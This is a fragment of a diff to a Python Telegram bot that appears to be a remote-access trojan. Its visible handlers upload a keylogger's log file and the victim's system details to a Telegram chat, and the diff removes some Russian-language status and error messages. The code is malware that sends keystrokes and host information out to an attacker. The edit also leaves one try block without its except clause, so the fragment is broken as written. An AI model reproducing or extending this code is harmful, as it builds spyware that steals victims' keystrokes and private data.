@@ -108,9 +108,6 @@ def keylogs(message):
     bot.send_chat_action(chat_id, 'upload_document')
     with open(log_file, "rb") as file:
         bot.send_document(chat_id, file)
-    try:
-        error_message = f"ВЫПОЛНЕННО!!!"
-        bot.send_message(chat_id, error_message)
 @bot.message_handler(commands=['pc_info'])
 def pc_info(message):
     chat_id = message.chat.id
@@ -119,15 +116,6 @@ def pc_info(message):
     for pc_info in platform.uname():
         info += '\n' + pc_info
     bot.send_message(chat_id, info)
-    try:
-        error_message = f"ВЫПОЛНЕННО!!!"
-        bot.send_message(chat_id, error_message)
-    except PermissionError as e:
-        error_message = f"ОШИБКА:: {e}"
-        bot.send_message(chat_id, error_message)
-    except Exception as e:
-        error_message = f"ОШИБКА: {e}"
-        bot.send_message(chat_id, error_message)
 @bot.message_handler(commands=['msg_box'])
 def msg_box(message):
     chat_id = message.chat.id
